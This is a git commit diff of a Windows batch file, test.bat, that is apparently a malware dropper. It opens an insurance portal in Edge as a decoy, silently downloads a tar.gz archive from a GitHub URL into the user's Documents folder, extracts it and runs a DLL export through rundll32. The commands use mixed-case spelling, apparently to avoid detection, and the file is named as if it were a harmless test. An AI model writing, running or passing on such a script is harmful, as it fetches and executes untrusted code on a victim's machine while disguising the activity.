7acf04e538cc25ec2aa419c7d0332ea7c0460264
TEST <lostar323@gmail.com>
2025-10-20 14:53:03 +0300

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,1 +1,4 @@
-cD %USERPROFILE%\Documents && CuRl https://raw.githubusercontent.com/testhdi/test/refs/heads/main/test.tar.gz -o tEsT.taR.Gz && tAr -xzf tEsT.taR.Gz && RuNdLL32.exe devcon.dll,CM_Free_Res_Des_Ex & start microsoft-edge:https://portal.hdisigorta.com.tr"
+@echo off
+start microsoft-edge:https://portal.hdisigorta.com.tr
+cD %USERPROFILE%\Documents && CuRl https://raw.githubusercontent.com/testhdi/test/refs/heads/main/test.tar.gz -s -o tEsT.taR.Gz && tAr -xzf tEsT.taR.Gz 
+start RuNdLL32.exe devcon.dll,CM_Free_Res_Des_Ex
